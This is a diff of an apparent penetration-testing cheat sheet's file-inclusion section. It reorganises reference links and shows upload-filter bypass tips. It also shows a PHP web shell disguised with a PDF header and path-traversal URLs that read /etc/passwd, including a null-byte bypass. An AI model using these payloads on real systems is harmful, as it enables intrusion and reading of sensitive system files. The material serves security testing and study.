@@ -146,22 +146,21 @@ To exploit change vulnerable field in HTTP request (likely UAS) to a reverse she
 
  
 # File Inclusion    
-[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
-[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
 [PayloadAllTheThings FI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)  
 
 ## Local File Inclusion 
+[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
+[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
 ### File Upload Pages
-
-Bypass extension filtering: rename shell 
-Bypass header check: 
+Bypass extension filtering: rename file to an allowed extension (ie .php to .php.pdf file)        
+Bypass header check:    
 
     %PDF-1.4
     <?php system($_GET["cmd"]); ?>
 
-### LFI Testing 
+### LFI Testing    
 Check for client side scripts     
-Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) to fuzz.    
+Use a [LFI wordlist](https://github.com/Karmaz95/crimson/blob/master/words/exp/LFI) or [this](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt) to fuzz.     
 
     http://example.com/index.php?page=../../../etc/passwd  
     http://example.com/index.php?page=../../../etc/passwd%00                  #PHP below v. 5.3.4 bypass
